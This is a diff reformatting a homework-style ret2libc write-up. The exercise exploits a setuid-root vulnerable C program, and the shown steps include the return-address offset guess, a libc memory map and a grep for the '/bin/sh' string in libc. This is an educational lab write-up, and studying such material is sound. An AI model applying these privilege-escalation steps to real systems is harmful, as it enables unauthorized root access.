@@ -1,5 +1,7 @@
 # Ret2libc
-Here the goal is to exploit the following simple program, when compiled with the following commands:
+
+## Task
+The goal is to exploit the following simple program, when compiled with the following commands:
 
 ```
 vijay@kali> cat vuln2.c
@@ -20,14 +22,16 @@ vijay@kali> sudo chown root vuln2
 vijay@kali> sudo chgrp root vuln2
 vijay@kali> sudo chmod +s vuln2
 ```
-
+<hr/>
 ## Solution
+
 ### Instuctions to run
 ```
 # exploit vuln2.c
 $ make clean && make vuln2
 $ python exploit2.py
 ```
+
 ### Explanation
 First, I guessed the offset of return address. In the code, we have only one local variable char buf[256]; which is of 256 bytes size. So return address might be located at 256 + 4 (old ebp) bytes.
 
@@ -74,9 +78,10 @@ Mapped address spaces:
          0x8048000  0x8049000     0x1000        0x0 /home/vijay/hw3/vuln3
          0x8049000  0x804a000     0x1000        0x0 /home/vijay/hw3/vuln3
         0xb7e05000 0xb7fb2000   0x1ad000        0x0 /lib/i386-linux-gnu/libc-2.23.so
+```
 
 Next, I searched for the location of "/bin/sh" string in /lib/i386-linux-gnu/libc-2.23.so:
-
+```
 vijay@kali:~/hw3$ strings -t x /lib/i386-linux-gnu/libc-2.23.so | grep /bin/sh
  158e64 /bin/sh
 
